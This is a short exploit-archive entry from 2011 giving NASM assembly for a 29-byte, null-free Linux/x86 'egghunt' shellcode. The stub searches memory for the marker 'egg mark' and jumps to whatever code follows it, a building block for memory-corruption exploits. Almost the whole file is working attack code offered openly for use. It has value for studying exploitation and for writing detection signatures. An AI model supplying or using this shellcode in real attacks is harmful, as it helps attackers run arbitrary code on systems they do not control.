;Exploit Title: Linux/x86 egghunt shellcode 29 bytes NULL free
;Date: 23-07-2011
;Author: Ali Raheem
;Tested on:
;Linux Ali-PC.home 2.6.38.8-35.fc15.x86_64 #1 SMP Wed Jul 6 13:58:54 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
;Linux injustice 2.6.38-10-generic #46-Ubuntu SMP Tue Jun 28 15:05:41 UTC 2011 i686 i686 i386 GNU/Linux
;http://codepad.org/2yMrNY5L Code pad lets you execute code live check here for a live demostration
;Thanks: Stealth- for testing and codepad.com for being so useful.

section .data
        egg     equ "egg "
        egg1    equ "mark"
section .text
    global  _start
_start:
        jmp     _return
_continue:
    pop     eax             ;This can point anywhere valid
_next:
        inc     eax     ;change to dec if you want to search backwards
_isEgg:
        cmp     dword [eax-8],egg
        jne     _next
        cmp     dword [eax-4],egg1
        jne     _next
        jmp     eax
_return:
        call    _continue
